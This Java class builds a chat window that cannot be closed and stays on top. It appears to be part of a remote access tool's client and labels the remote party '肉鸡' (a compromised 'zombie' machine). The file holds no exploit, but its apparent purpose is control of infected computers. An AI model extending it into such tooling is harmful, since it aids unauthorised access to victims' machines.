package me.client.send;

import me.client.Client;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Chat {

    public JTextArea jta = new JTextArea();
    public JDialog jWindow = new JDialog();
    Socket socket;

    public Chat(Socket socket) {
        this.socket = socket;
    }

    public void getMSG(OutputStreamWriter writer) throws IOException {
        jWindow.setAlwaysOnTop(true);
        jWindow.setTitle("聊天");
        jWindow.setDefaultCloseOperation(WindowConstants.DO_NOTHING_ON_CLOSE);
        InputStream inputStream = Client.class.getClassLoader().getResourceAsStream("me/client/resources/Chat.png");
        Image image = ImageIO.read(inputStream);
        jWindow.setIconImage(image);
        jta.setEditable(false);
        jta.setBackground(Color.BLACK);
        jta.setForeground(Color.green);
        JScrollPane jsp=new JScrollPane(jta);
        JPanel jp=new JPanel();
        JTextField jtf=new JTextField(15);
        JButton jb=new JButton("发送");
        jb.setBackground(new Color(0, 250, 0));
        jp.add(jtf);
        jp.add(jb);
        Font font = new Font(Font.SERIF,Font.PLAIN,13);
        jta.setFont(font);
        jtf.setFont(font);
        jWindow.add(jsp,BorderLayout.CENTER);
        jWindow.add(jp,BorderLayout.SOUTH);
        jWindow.setSize(500,300);
        jWindow.setLocationRelativeTo(null);
        jWindow.setVisible(true);
        jb.addActionListener(a->{
            try {
                SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy:MM:dd  hh:mm:ss");
                Date date = new Date();
                dateFormat.format(date);
                writer.write(date + "\n");
                writer.write("肉鸡: " + jtf.getText() + "\n");
                writer.flush();
                jta.append(date + "\n");
                jta.append("我: " + jtf.getText() + "\n");
                jtf.setText("");
            }catch (Exception e) {
            }
        });
    }

}
